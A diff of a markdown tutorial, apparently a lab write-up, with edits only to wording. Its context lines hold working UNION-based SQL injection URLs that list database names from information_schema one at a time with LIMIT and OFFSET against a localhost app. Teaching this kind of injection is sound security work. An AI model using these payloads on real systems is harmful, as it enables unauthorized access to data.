@@ -23,7 +23,7 @@ But we will get this error:
 }
 ```
 
-This is because the query returns more than one row. So we have to *limit* the output listing the databases one by one, like this:
+This is because the query returns more than one row. So we have to *limit* the output, listing the databases **one by one**, like this:
 ```shell
 http://localhost:8080/p/2 UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 1),3,4,5,6,7,8,9/slug-name-post'
 ```
@@ -33,11 +33,11 @@ So now we have the first database. For the next one we can use the OFFSET trick,
 http://localhost:8080/p/2 UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1),3,4,5,6,7,8,9/slug-name-post'
 ```
 
-With this OFFSET trick we are skipping the first database and getting the second one. Then we skip another one:
+With this OFFSET trick we are skipping the first database and getting the second one. Then we skip another one to get the next one:
 ```shell
 http://localhost:8080/p/2 UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 2),3,4,5,6,7,8,9/slug-name-post'
 ```
 
 We keep skipping until getting all the databases.
 
-And that is it!! Mission accomplish!
+And that is it!! Mission accomplished!
